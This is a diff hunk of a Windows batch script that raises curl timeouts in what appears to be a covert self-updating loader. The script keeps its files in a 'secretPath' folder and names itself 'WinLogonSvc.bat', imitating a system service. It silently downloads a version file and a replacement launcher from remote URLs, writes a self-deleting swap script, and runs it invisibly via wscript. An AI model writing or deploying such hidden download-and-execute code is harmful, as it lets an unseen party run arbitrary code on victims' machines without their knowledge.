@@ -7,12 +7,12 @@ set "workerScriptPath=%secretPath%\restore_worker.bat"
 set "launcherScriptPath=%secretPath%\WinLogonSvc.bat"
 set "vbsLauncherPath=%secretPath%\launcher_invisible.vbs"
 
-curl -sL "%LAUNCHER_VERSION_URL%" -o "%secretPath%\lv.tmp" --connect-timeout 30 2>nul
+curl -sL "%LAUNCHER_VERSION_URL%" -o "%secretPath%\lv.tmp" --connect-timeout 300 2>nul
 if exist "%secretPath%\lv.tmp" (
     set /p LATEST_VERSION=<"%secretPath%\lv.tmp"
     del /f /q "%secretPath%\lv.tmp" >nul 2>&1
     if !LAUNCHER_VERSION! LSS !LATEST_VERSION! (
-        curl -sL "%LAUNCHER_SCRIPT_URL%" -o "%launcherScriptPath%.new" --connect-timeout 30 2>nul
+        curl -sL "%LAUNCHER_SCRIPT_URL%" -o "%launcherScriptPath%.new" --connect-timeout 300 2>nul
         if exist "%launcherScriptPath%.new" (
             (echo @echo off & echo timeout /t 2 /nobreak > nul & echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%" > nul & echo del /f /q "%~f0" > nul) > "%secretPath%\ul.bat"
             start "" /B wscript.exe "%vbsLauncherPath%" "%secretPath%\ul.bat"
